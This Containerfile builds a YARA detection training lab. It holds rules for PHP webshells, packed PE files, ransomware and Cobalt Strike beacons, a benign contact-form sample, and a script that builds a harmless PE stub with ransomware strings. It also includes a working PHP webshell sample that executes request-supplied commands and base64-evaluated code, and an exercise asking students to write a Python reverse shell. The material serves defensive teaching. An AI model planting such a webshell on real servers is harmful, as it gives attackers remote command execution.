# YARA - Detection Rule Lab Container
# Purpose: YARA pre-installed with sample malware snippets, benign files,
#          template rules, and an automated validation script.
# Build:  podman build -f yara.Containerfile -t yara-lab .
# Run:    podman run -it --rm yara-lab
FROM docker.io/archlinux:latest

RUN pacman -Syu --noconfirm && \
    pacman -S --noconfirm yara python python-pip git bash coreutils xxd && \
    yes | pacman -Scc

COPY <<'HEREDOC' /opt/exercise/rules/webshell_php_generic.yar
rule Webshell_PHP_Generic
{
    meta:
        description = "Detects common PHP webshell patterns — eval/assert with request variables"
        author = "Student"
        date = "2026-06-26"
        severity = "HIGH"
        reference = "https://github.com/tennc/webshell"

    strings:
        $func_eval     = "eval(" ascii nocase
        $func_assert   = "assert(" ascii nocase
        $func_system   = "system(" ascii nocase
        $func_exec     = "exec(" ascii nocase
        $func_passthru = "passthru(" ascii nocase
        $func_shell    = "shell_exec(" ascii nocase

        $var_request   = "$_REQUEST" ascii nocase
        $var_post      = "$_POST" ascii nocase
        $var_get       = "$_GET" ascii nocase

        $b64_decode    = "base64_decode" ascii nocase

    condition:
        (any of ($func_*) and any of ($var_*)) or ($b64_decode and $var_request)
}
HEREDOC

COPY <<'HEREDOC' /opt/exercise/rules/suspicious_pe_characteristics.yar
import "pe"
import "math"

rule Suspicious_PE_Characteristics
{
    meta:
        description = "Detects executables with suspicious PE header characteristics — packed, unsigned, high entropy"
        author = "Student"
        date = "2026-06-26"
        severity = "MEDIUM"

    condition:
        pe.number_of_signatures == 0
        and pe.number_of_sections >= 3
        and math.entropy(pe.sections[0].raw_data_offset, pe.sections[0].raw_data_size) > 6.5
        and (
            pe.imports("kernel32.dll", "VirtualAlloc")
            or pe.imports("ntdll.dll", "NtAllocateVirtualMemory")
        )
        and filesize < 10MB
}
HEREDOC

COPY <<'HEREDOC' /opt/exercise/rules/ransomware_generic.yar
rule Ransomware_Generic_Crypto_FileOps
{
    meta:
        description = "Detects generic ransomware indicators — crypto APIs with file enumeration"
        author = "Student"
        date = "2026-06-26"
        severity = "HIGH"

    strings:
        $crypto_acquire = "CryptAcquireContext" ascii wide
        $crypto_encrypt = "CryptEncrypt" ascii wide
        $crypto_genrand = "CryptGenRandom" ascii wide

        $find_first = "FindFirstFile" ascii wide
        $find_next  = "FindNextFile" ascii wide

        $delete_file = "DeleteFile" ascii wide
        $move_file   = "MoveFile" ascii wide

        $ransom_note = "YOUR_FILES_ARE_ENCRYPTED" ascii wide nocase

        $ext_regex   = /\.(encrypted|locked|enc|crypt|locky|wncry|zzzz)/ nocase

    condition:
        (2 of ($crypto_*) and 2 of ($find_*) and any of ($delete_file, $move_file))
        or ($ransom_note and any of ($crypto_*))
        or ($ext_regex and any of ($crypto_*) and any of ($find_*))
}
HEREDOC

COPY <<'HEREDOC' /opt/exercise/rules/cobalt_strike_beacon.yar
rule CobaltStrike_Beacon_Generic
{
    meta:
        description = "Detects Cobalt Strike beacon configuration patterns in binary/memory"
        author = "Student"
        date = "2026-06-26"
        severity = "HIGH"
        reference = "https://attack.mitre.org/software/S0154/"

    strings:
        $cmd_a = "sleep" ascii wide nocase
        $cmd_b = "spawn" ascii wide nocase
        $cmd_c = "inject" ascii wide nocase
        $cmd_d = "shell" ascii wide nocase
        $cmd_e = "upload" ascii wide nocase
        $cmd_f = "download" ascii wide nocase

        $enc_a = { 6A 00 68 [4] FF 15 [4] 85 C0 }
        $enc_b = { 55 8B EC 51 8B 45 [1-4] 83 C0 }

        $url_re = /https?:\/\/([a-z0-9-]+\.)+[a-z]{2,}\/[a-zA-Z0-9\/]{4,12}/ nocase

        $ua_string = "Mozilla/5.0" ascii wide

    condition:
        (3 of ($cmd_*) and any of ($enc_*))
        or ($url_re and $ua_string and filesize < 5MB)
}
HEREDOC

COPY <<'HEREDOC' /opt/exercise/samples/malicious_webshell.php
<?php
if (isset($_REQUEST['cmd'])) {
    $cmd = $_REQUEST['cmd'];
    if (function_exists('exec')) {
        exec($cmd, $output);
        echo implode("\n", $output);
    } elseif (function_exists('system')) {
        system($cmd);
    }
}

if (isset($_POST['pass']) && $_POST['pass'] === 'hunter2') {
    eval(base64_decode($_POST['code']));
}

if (isset($_GET['shell'])) {
    passthru($_GET['shell']);
}

echo shell_exec('id');
?>
HEREDOC

COPY <<'HEREDOC' /opt/exercise/samples/benign_contact_form.php
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $name = htmlspecialchars($_POST['name'] ?? '');
    $email = filter_var($_POST['email'] ?? '', FILTER_VALIDATE_EMAIL);
    $message = htmlspecialchars($_POST['message'] ?? '');

    if ($name && $email && $message) {
        $to = 'admin@example.com';
        $subject = "Contact Form: $name";
        $body = "From: $name <$email>\n\n$message";
        mail($to, $subject, $body);
        echo "Message sent successfully.";
    } else {
        echo "Please fill in all fields.";
    }
}
?>
<form method="post">
    <input name="name" placeholder="Name">
    <input name="email" placeholder="Email">
    <textarea name="message" placeholder="Message"></textarea>
    <button type="submit">Send</button>
</form>
HEREDOC

COPY <<'HEREDOC' /opt/exercise/samples/malicious_binary.hex
# Hex snippet from a packed ransomware dropper
# This is a fragment — the full binary would be analyzed with YARA
# Feature: CryptAcquireContext + FindFirstFile + extension .encrypted
# Build a runnable test binary:
python3 << 'PYEOF'
import struct, hashlib

# Minimal PE stub with suspicious strings
data = b'MZ\x90\x00' + b'\x00' * 60
data += struct.pack('<I', 0x80) + b'\x00' * (0x80 - 68)
data += b'\x00' * 0x100  # padding

# Embed suspicious strings
data += b'CryptAcquireContextW\x00'
data += b'CryptEncrypt\x00'
data += b'CryptGenRandom\x00'
data += b'FindFirstFileW\x00'
data += b'FindNextFileW\x00'
data += b'DeleteFileW\x00'
data += b'.encrypted\x00'
data += b'YOUR_FILES_ARE_ENCRYPTED\x00'

with open('/opt/exercise/samples/ransomware_test.exe', 'wb') as f:
    f.write(data)

sha = hashlib.sha256(data).hexdigest()
print(f"Created ransomware_test.exe ({sha})")
PYEOF
HEREDOC

RUN python3 << 'PYEOF'
import struct, hashlib

data = b'MZ\x90\x00' + b'\x00' * 60
data += struct.pack('<I', 0x80) + b'\x00' * (0x80 - 68)
data += b'\x00' * 0x100
data += b'CryptAcquireContextW\x00'
data += b'CryptEncrypt\x00'
data += b'CryptGenRandom\x00'
data += b'FindFirstFileW\x00'
data += b'FindNextFileW\x00'
data += b'DeleteFileW\x00'
data += b'.encrypted\x00'
data += b'YOUR_FILES_ARE_ENCRYPTED\x00'

with open('/opt/exercise/samples/ransomware_test.exe', 'wb') as f:
    f.write(data)
print(f"Created ransomware_test.exe")
PYEOF

COPY <<'HEREDOC' /opt/exercise/run_exercises.sh
#!/bin/bash
set -e

echo "================================================="
echo "  YARA Detection — Lab Exercises"
echo "================================================="
echo

echo "=== Exercise 1: Compile Rules ==="
yarac /opt/exercise/rules/*.yar /tmp/rules.compiled
echo "Compiled ruleset: /tmp/rules.compiled"
echo

echo "=== Exercise 2: Scan Samples ==="
echo

echo "--- Scanning webshell (malicious) ---"
yara -s /opt/exercise/rules/webshell_php_generic.yar \
  /opt/exercise/samples/malicious_webshell.php
echo

echo "--- Scanning contact form (benign — should NOT match) ---"
yara /opt/exercise/rules/webshell_php_generic.yar \
  /opt/exercise/samples/benign_contact_form.php \
  && echo "WARNING: Benign file matched! Rule needs tuning." \
  || echo "PASS: Benign file correctly ignored."
echo

echo "--- Scanning ransomware sample (malicious) ---"
yara -s /opt/exercise/rules/ransomware_generic.yar \
  /opt/exercise/samples/ransomware_test.exe
echo

echo "=== Exercise 3: Scan with Compiled Rules ==="
yara -C /tmp/rules.compiled /opt/exercise/samples/
echo

echo "=== Exercise 4: JSON Output ==="
yara -j /opt/exercise/rules/webshell_php_generic.yar \
  /opt/exercise/samples/malicious_webshell.php | python3 -m json.tool
echo

echo "=== Exercise 5: String Detection Only ==="
echo "Showing all matching strings and their offsets:"
yara -s /opt/exercise/rules/ransomware_generic.yar \
  /opt/exercise/samples/ransomware_test.exe
echo

echo "=== Exercise 6: Write Your Own Rule ==="
echo "Create a new YARA rule in /opt/exercise/rules/"
echo
echo "Task: Write a rule to detect reverse shell code in Python scripts"
echo "Look for: socket.socket, subprocess.Popen, os.dup2 patterns"
echo "Test against: create a Python reverse shell snippet in /opt/exercise/samples/"
echo

echo "================================================="
echo "  All Exercises Complete"
echo "================================================="
HEREDOC

RUN chmod +x /opt/exercise/run_exercises.sh

WORKDIR /opt/exercise
CMD ["/bin/bash", "-c", "./run_exercises.sh && exec /bin/bash"]
